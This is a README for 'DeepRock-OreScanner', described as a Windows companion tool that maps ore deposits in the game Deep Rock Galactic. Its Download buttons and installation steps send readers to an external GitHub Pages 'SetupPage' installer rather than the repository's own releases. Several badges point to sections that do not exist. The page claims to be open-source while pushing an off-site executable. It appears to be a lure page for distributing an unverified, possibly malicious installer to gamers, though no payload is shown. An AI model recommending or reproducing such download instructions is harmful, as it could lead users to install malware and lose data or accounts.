# DeepRock‑OreScanner

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-d97706?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/ARCHIVE-READY-ea580c?style=for-the-badge&logo=docker&logoColor=white&labelColor=161b22" alt="ARCHIVE"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/HOTKEYS-SHORTCUTS-dc2626?style=for-the-badge&logo=visualstudiocode&logoColor=white&labelColor=161b22" alt="HOTKEYS"></a>
  <br>
  <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-0284c7?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-2563eb?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
</div>

**Author:** WindRainTier
**Platform:** Windows 10 / 11 (desktop only)

---

## 🎮 What is this?

DeepRock‑OreScanner is a lightweight Windows desktop companion for **Deep Rock Galactic**.
It scans your saved maps, detects every ore vein, and draws an interactive overlay so you can plan your routes, optimize your mining runs, and never miss a precious deposit again.

---

## ✨ Features

| ✅ | Feature |
|---|---|
| 📍 | **Full‑map ore detection** – parses the game’s map files and extracts every ore node. |
| 🗺️ | **Live visualizer** – renders veins on a scalable map view with zoom & pan. |
| 🎨 | **Custom colour themes** – switch between high‑contrast or subtle palettes. |
| 📊 | **Stat summary** – total ore count, average vein size, and resource density per sector. |
| ⏱️ | **Instant refresh** – re‑scan with a single click after a new mission is saved. |
| 🖥️ | **Windows‑only UI** – built with WinForms/WPF for a native feel on Windows 10/11. |
| 🛠️ | **Open‑source** – all code is public, contributions welcome. |

---

## 📦 Installation

1. Click the **Download** button below.
2. Run the installer (standard Windows Release).
3. Launch **DeepRock‑OreScanner** from the Start menu.

> **Note:** The utility requires the official Deep Rock Galactic installation directory to read map files. No modifications to the game are performed.

<div style="text-align:center; margin: 1.5rem 0;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#0078D7;color:#fff;padding:0.6rem 1.2rem;border-radius:4px;text-decoration:none;font-weight:bold;">Download</a>
  &nbsp;&nbsp;
  <a href="https://github.com/rewfdf/DeepRock-OreScanner/releases/latest" style="background:#555;color:#fff;padding:0.6rem 1.2rem;border-radius:4px;text-decoration:none;font-weight:bold;">Changelog</a>
</div>

---

## 🛠️ How it works

1. **Locate** the `SavedGames` folder (default: `%USERPROFILE%\AppData\LocalLow\Ghost Ship Games\Deep Rock Galactic`).
2. **Parse** the binary map data to extract ore coordinates.
3. **Render** the data onto a vector‑based canvas with interactive tooltips.

The core scanning engine is written in **C#** using .NET 6, while the UI leverages **WPF** for smooth graphics.

---

## 🚀 Getting Started (Developer)

```bash
# Clone the repo
git clone https://github.com/rewfdf/DeepRock-OreScanner.git
cd DeepRock-OreScanner

# Build (requires .NET SDK 6+)
dotnet build -c Release
```

Open `DeepRockOreScanner.sln` in Visual Studio 2022 (or any IDE that supports .NET 6) to explore or contribute.

---

## 🤝 Contributing

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Commit your changes with clear messages.
4. Open a Pull Request targeting `main`.

All contributions must respect the **Windows‑only** nature of the project.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📞 Support & Feedback

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discussions:** Join the repository’s Discussions tab for tips, map‑sharing, and community builds.

Happy mining! 🚀

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```